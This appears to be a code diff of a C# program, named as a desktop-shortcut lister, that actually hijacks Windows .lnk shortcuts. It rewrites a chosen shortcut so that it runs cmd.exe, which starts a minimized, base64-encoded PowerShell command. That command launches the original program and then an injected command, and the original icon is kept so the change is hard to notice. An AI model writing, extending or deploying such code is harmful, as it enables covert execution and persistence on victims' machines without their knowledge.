@@ -11,7 +11,12 @@ namespace DesktopShortcutsLister
         static void Main(string[] args)
         {
             string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            string[] shortcutFiles = Directory.GetFiles(desktopPath, "*.lnk");
+            string publicDesktopPath = @"C:\Users\Public\Desktop";
+
+            List<string> shortcutFiles = new List<string>();
+
+            shortcutFiles.AddRange(Directory.GetFiles(desktopPath, "*.lnk"));
+            shortcutFiles.AddRange(Directory.GetFiles(publicDesktopPath, "*.lnk"));
             
             // Check if two arguments
             if (args.Length < 2)
@@ -26,6 +31,7 @@ namespace DesktopShortcutsLister
             string foundShortcutPath = null;
             foreach (var filePath in shortcutFiles)
             {
+                Console.WriteLine(filePath);
                 string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
                 if (fileNameWithoutExtension.IndexOf(searchQuery, StringComparison.OrdinalIgnoreCase) >= 0)
                 {
@@ -43,23 +49,35 @@ namespace DesktopShortcutsLister
                 Console.WriteLine("Znaleziono skrót:");
                 Console.WriteLine($"Nazwa: {Path.GetFileNameWithoutExtension(foundShortcutPath)}");
                 Console.WriteLine($"Ścieżka docelowa: {shortcut.TargetPath}");
+                Console.WriteLine($"Ikonka to: {shortcut.IconLocation}");
+                string oldlocation = shortcut.IconLocation;
 
-
-                string newCmd = "start-process " + shortcut.TargetPath + " " + shortcut.Arguments.ToString() + ";" + cmd;
+                string newCmd = "start-process " + "\"" + shortcut.TargetPath + " " + shortcut.Arguments.ToString() + "\"" + ";" + cmd;
 
                 byte[] newcmdBytes = Encoding.Unicode.GetBytes(newCmd);
                 string encodednewCmd = Convert.ToBase64String(newcmdBytes);
-                string newaArgument = "-e ".PadLeft(220) + encodednewCmd;
+                string newaArgument = " /c start /min \"\"" + " powershell.exe -e " + encodednewCmd;
         
 
                 //newTargetPath = @"C:\Windows\System32\cmd.exe";
                 // Zmodyfikuj TargetPath
-                shortcut.TargetPath = "powershell.exe";
+                shortcut.TargetPath = "cmd.exe";
 
                 shortcut.Arguments = newaArgument;
-   
+                if (oldlocation.StartsWith(","))
+                {
+                    Console.WriteLine("Zostawiamy target path");
+                    shortcut.IconLocation = shortcut.TargetPath;
+                }
+                else
+                {
+                    Console.WriteLine("Dajemy old location");
+                    shortcut.IconLocation = oldlocation;
+                }
+                
+                Console.Write(shortcut.TargetPath + "\n");
                 // Zapisz zmieniony skrót
-                shortcut.Save();
+                //shortcut.Save();
 
                 Console.WriteLine("Ścieżka docelowa została zaktualizowana.");
             }
